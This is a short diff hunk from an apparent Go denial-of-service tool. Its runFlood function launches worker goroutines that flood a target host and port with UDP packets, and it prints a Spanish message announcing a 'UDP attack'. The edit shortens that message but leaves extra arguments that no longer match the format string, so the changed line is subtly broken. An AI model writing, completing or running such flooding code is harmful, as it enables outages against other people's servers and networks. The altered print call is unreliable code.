@@ -92,7 +92,7 @@ func runFlood(target string, port, duration int) {
 	var wg sync.WaitGroup
 	wg.Add(threads)
 
-	fmt.Printf("Iniciando ataque UDP a %s:%d con %d threads, %d PPS y tamaño de paquete %d bytes\n", target, port, threads, ppsLimit, packetSize)
+	fmt.Printf("Iniciando ataque UDP a %s:%d\n", target, port, threads, ppsLimit, packetSize)
 
 	for i := 0; i < threads; i++ {
 		go flood(target, port, duration, &wg)
